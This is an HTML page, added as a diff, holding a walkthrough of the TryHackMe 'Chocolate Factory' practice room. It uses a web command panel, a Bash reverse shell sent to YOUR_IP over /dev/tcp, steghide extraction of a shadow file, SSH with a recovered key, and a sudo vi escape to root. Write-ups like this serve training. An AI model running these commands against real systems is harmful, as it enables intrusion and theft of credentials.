@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://challenges.cloudflare.com; style-src 'self' https://cdnjs.cloudflare.com; font-src 'self' https://cdnjs.cloudflare.com; img-src 'self' data:; connect-src 'self' https://formspree.io https://hacker-news.firebaseio.com; frame-src https://challenges.cloudflare.com; form-action 'self' https://formspree.io; base-uri 'self'; object-src 'none'; upgrade-insecure-requests">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>Chocolate Factory Write-up (TryHackMe) | White Rabbit Security</title>
+    <meta name="description" content="A walkthrough of the TryHackMe Chocolate Factory room: a web command panel, a key hidden in a photo with steghide, SSH with a recovered key, and a sudo editor to root.">
+    <meta name="theme-color" content="#060b13">
+    <link rel="canonical" href="https://whiterabbitsecurity.app/learn/writeups/chocolate-factory/">
+    <link rel="icon" href="/img/favicon-32.png" type="image/png" sizes="32x32">
+    <link rel="icon" href="/img/favicon-192.png" type="image/png" sizes="192x192">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <meta property="og:site_name" content="White Rabbit Security">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:title" content="Chocolate Factory Write-up (TryHackMe) | White Rabbit Security">
+    <meta property="og:description" content="A walkthrough of the TryHackMe Chocolate Factory room: a web command panel, a key hidden in a photo with steghide, SSH with a recovered key, and a sudo editor to root.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://whiterabbitsecurity.app/learn/writeups/chocolate-factory/">
+    <meta property="og:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <meta property="og:image:alt" content="White Rabbit Security crest">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Chocolate Factory Write-up (TryHackMe) | White Rabbit Security">
+    <meta name="twitter:description" content="A walkthrough of the TryHackMe Chocolate Factory room: a web command panel, a key hidden in a photo with steghide, SSH with a recovered key, and a sudo editor to root.">
+    <meta name="twitter:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <a class="skip-link" href="#main">Skip to content</a>
+    <nav>
+        <a href="/" class="nav-logo">
+            <img src="/img/logo-mark.png" alt="White Rabbit Security" width="40" height="40">
+        </a>
+        <div class="nav-links">
+            <a href="/">Home</a>
+            <a href="/services/">Services</a>
+            <a href="/about/">About</a>
+            <a href="/news/">News</a>
+            <a href="/contact/">Contact</a>
+            <a href="/learn/" class="active" aria-current="page">Learn</a>
+        </div>
+    </nav>
+
+    <main id="main" tabindex="-1">
+        <header class="hero">
+            <h1>Chocolate <span class="highlight">Factory</span></h1>
+            <p>TryHackMe &middot; Linux &middot; Easy. A playful room with a serious core: a command panel on the web, a secret hidden inside a photo, a reused key, and a sudo editor that leads to root.</p>
+            <p class="lede">Targets, keys, and flag values are from a shared practice environment and are redacted here. The point is the method, not the answers.</p>
+        </header>
+
+        <section class="services" aria-labelledby="c-recon">
+            <h2 id="c-recon" class="section-title">1. <span class="highlight">Recon</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>A full scan shows FTP, SSH, HTTP &mdash; and a long wall of open ports (roughly 100&ndash;125) that all return the same joke banner. That noise is deliberate; one of those banners quietly points at a web path worth remembering.</p>
+                <pre class="code-block"><code>nmap -p- --min-rate 1000 -oA scans/all-ports TARGET
+nmap -p 21,22,80,100-125 -sC -sV -oA scans/services TARGET</code></pre>
+                <ul class="spec-list">
+                    <li><i class="fa-solid fa-folder-tree" aria-hidden="true"></i> <strong>21/tcp</strong> &mdash; vsFTPd with anonymous login allowed, offering a single image, <code>gum_room.jpg</code>.</li>
+                    <li><i class="fa-solid fa-lock" aria-hidden="true"></i> <strong>22/tcp</strong> &mdash; OpenSSH.</li>
+                    <li><i class="fa-solid fa-globe" aria-hidden="true"></i> <strong>80/tcp</strong> &mdash; Apache.</li>
+                    <li><i class="fa-solid fa-masks-theater" aria-hidden="true"></i> <strong>100&ndash;125/tcp</strong> &mdash; decoy banners. One hints at a URL ending in <code>key_rev_key</code>.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="c-web">
+            <h2 id="c-web" class="section-title">2. A Command Panel on the <span class="highlight">Web</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Content discovery against port 80 turns up a backup file and, more importantly, a page that runs commands.</p>
+                <pre class="code-block"><code>dirsearch -u http://TARGET/
+# /home.php        -> runs shell commands
+# /index.php.bak   -> source backup, worth reading</code></pre>
+                <p>The <code>home.php</code> panel executes whatever you type on the server. Use it to look around and read the first key the room hides in the web root.</p>
+                <pre class="code-block"><code>ls -la
+cat key_rev_key   # first key (redacted) — keep it, you will need it at the end</code></pre>
+                <p>That key is a Fernet encryption key; the final flag is encrypted with it.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="c-foothold">
+            <h2 id="c-foothold" class="section-title">3. From Panel to <span class="highlight">Shell</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>A command panel is remote code execution, so trade it for a proper reverse shell. Start a listener, then run a Bash reverse shell through the panel.</p>
+                <pre class="code-block"><code># on your box
+nc -lvnp 1337
+
+# through the panel
+bash -c 'bash -i >&/dev/tcp/YOUR_IP/1337 0>&1'</code></pre>
+                <p>Enumerating the web files reveals a username (<strong>charlie</strong>) and a password in the application source. Hold onto both.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="c-steg">
+            <h2 id="c-steg" class="section-title">4. The Hidden File in the <span class="highlight">Photo</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Pull the image from FTP and check it for embedded data. The passphrase is the password recovered a moment ago &mdash; secrets in this room are reused on purpose.</p>
+                <pre class="code-block"><code>wget ftp://TARGET/gum_room.jpg      # anonymous
+steghide info gum_room.jpg
+steghide extract -sf gum_room.jpg    # enter the recovered password</code></pre>
+                <p>The extracted file is Base64. Decoding it gives a copy of the system <code>shadow</code> file, including charlie's password hash &mdash; a second route to his account if you want to crack it.</p>
+                <pre class="code-block"><code>base64 -d b64.txt &gt; shadow.txt</code></pre>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="c-ssh">
+            <h2 id="c-ssh" class="section-title">5. SSH as <span class="highlight">charlie</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>In charlie's home directory there is a private key (named <code>teleport</code>). Use it to log in cleanly over SSH.</p>
+                <pre class="code-block"><code>chmod 600 teleport
+ssh -i teleport charlie@TARGET
+cat user.txt    # flag{...}</code></pre>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="c-root">
+            <h2 id="c-root" class="section-title">6. <span class="highlight">Root</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>The first thing to check as any new user is what sudo allows.</p>
+                <pre class="code-block"><code>sudo -l</code></pre>
+                <p>charlie may run an editor as root without a password. An interactive editor that can run as root is a direct escape to a root shell (see GTFOBins for the exact syntax).</p>
+                <pre class="code-block"><code>sudo vi -c ':!/bin/sh' /dev/null
+# now root
+id</code></pre>
+                <p>The root flag is stored encrypted. Decrypt it with the Fernet <code>key_rev_key</code> recovered back in step&nbsp;2, using a few lines of Python.</p>
+                <pre class="code-block"><code>python3 -c "from cryptography.fernet import Fernet; \
+print(Fernet(open('key_rev_key','rb').read().strip()).decrypt(open('root.txt','rb').read()))"</code></pre>
+                <h3>Why it worked</h3>
+                <p>Every step reused something from the last: the web key unlocked the final flag, the web password unlocked the photo, and the photo and source handed over the account. The one privileged mistake &mdash; an editor runnable as root &mdash; finished it.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="c-lessons">
+            <h2 id="c-lessons" class="section-title">What To <span class="highlight">Take Away</span></h2>
+            <div class="service-card prose-card">
+                <ul class="spec-list">
+                    <li><i class="fa-solid fa-terminal" aria-hidden="true"></i> A page that runs commands is remote code execution. Treat it as a shell immediately.</li>
+                    <li><i class="fa-solid fa-image" aria-hidden="true"></i> Check images for steganography, and try passwords you have already found as the passphrase.</li>
+                    <li><i class="fa-solid fa-key" aria-hidden="true"></i> Never leave private keys or source backups readable from the web.</li>
+                    <li><i class="fa-solid fa-user-gear" aria-hidden="true"></i> Always run <code>sudo -l</code>. An editor allowed as root is root via GTFOBins.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="services">
+            <div class="uplink">
+                <div class="uplink-icon"><i class="fa-solid fa-flag" aria-hidden="true"></i></div>
+                <h2>Try It <span class="highlight">Yourself</span></h2>
+                <p>Chocolate Factory is a free, beginner-friendly room on TryHackMe. Give it a go before reading this, then compare notes.</p>
+                <div class="hero-buttons">
+                    <a href="https://tryhackme.com/room/chocolatefactory" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Open on TryHackMe</a>
+                    <a href="/learn/writeups/" class="btn btn-outline">All write-ups</a>
+                </div>
+            </div>
+        </section>
+        <section class="services">
+            <div class="service-actions"><a href="/learn/writeups/" class="btn btn-outline btn-sm">Back to Write-ups</a></div>
+        </section>
+    </main>
+    <footer class="site-footer">
+        <p>&copy; 2026 White Rabbit Security</p>
+        <p>Client information shared with us is treated as confidential. Do not send passwords or sensitive data through this site.</p>
+        <p class="footer-links"><a href="/contact/">Contact</a> <a href="/privacy/">Privacy</a> <a href="/.well-known/security.txt">security.txt</a></p>
+    </footer>
+</body>
+</html>
